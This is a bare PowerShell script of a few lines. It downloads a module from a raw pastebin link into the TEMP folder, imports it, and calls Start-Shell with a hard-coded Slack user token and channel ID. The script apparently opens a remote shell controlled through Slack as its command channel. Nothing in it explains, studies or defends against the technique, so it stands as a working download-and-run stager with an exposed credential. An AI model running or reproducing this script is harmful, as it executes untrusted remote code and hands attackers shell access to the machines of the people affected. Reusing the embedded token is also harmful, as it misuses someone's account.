$s = "https://pastebin.com/raw/Da0CEcYU"
$d = $env:TEMP + '\slack.psm1'
(New-Object System.Net.WebClient).DownloadFile($s,$d)
Import-Module $d
Start-Shell -Token "xoxp-728684033777-728684034785-735127625461-585ea90ac2ba449b4ad1424d853470be" -Channel "CMEL4222D"
